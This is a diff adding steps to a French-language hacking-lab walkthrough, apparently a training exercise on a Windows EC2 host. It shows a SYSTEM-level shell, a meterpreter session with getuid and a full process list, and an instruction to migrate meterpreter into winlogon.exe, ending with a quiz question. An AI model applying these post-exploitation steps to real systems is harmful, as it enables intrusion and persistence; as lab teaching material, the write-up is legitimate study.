@@ -303,4 +303,60 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32>whoami
 whoami
 nt authority\system
+
+CTrl-C
 ```
+
+- Confirmer avec le meterpreter
+
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+- Lister les processus qui tournent sur la machine cible
+
+```
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 520   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 584   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 688   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 696   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 704   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 808   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 876   688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 928   688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 992   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1064  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1144  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1332  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1400  688   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1472  688   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1584  688   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1824  688   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1876  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2032  808   WmiPrvSE.exe
+ 2548  688   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+ 2808  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 2836  688   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2872  688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 2956  688   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+ 
+ ```
+ 
+- Migrer l'interpreteur vers le processus winlogon.exe pour plus de stabilité
+ (utiliser la commande MIGRATE)
+ Quel était le processus vérolé par l'interpreteur avant migration ? 
